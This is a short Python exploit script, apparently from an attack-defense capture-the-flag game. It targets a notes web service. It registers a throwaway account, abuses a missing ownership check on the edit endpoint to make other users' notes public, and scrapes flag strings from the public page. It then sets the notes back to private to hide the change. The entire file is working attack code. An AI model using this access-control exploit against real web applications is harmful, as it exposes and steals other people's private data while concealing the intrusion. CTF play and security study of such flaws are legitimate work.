from utils import attack_data, generate_random_string
import sys
import re
import requests


def sploit(host: str, note_id: int):
    session = requests.Session()
    username, password = generate_random_string(12), generate_random_string(12)
    session.post(
        f"http://{host}:5000/register",
        data={
            "username": username,
            "password": password
        }
    )
    session.post(
        f"http://{host}:5000/login",
        data={
            "username": username,
            "password": password
        }
    )
    
    session.post(
        f"http://{host}:5000/edit/{note_id}",
        json={
            "content": "test",
            "is_public": "true"
        }
    )
    r = session.get(
        f"http://{host}:5000/public"
    )
    flags = '\n'.join(re.findall("[0-9-A-Z]{31}=", r.text))
    
    session.post(
        f"http://{host}:5000/edit/{note_id}",
        json={
            "content": "test",
            "is_public": "false"
        }
    )
    
    print(flags, flush=True)


if __name__ == "__main__":
    host = sys.argv[1]
    for ad in attack_data(host):
        _, _, note_id = ad.split(":")
        sploit(host, int(note_id))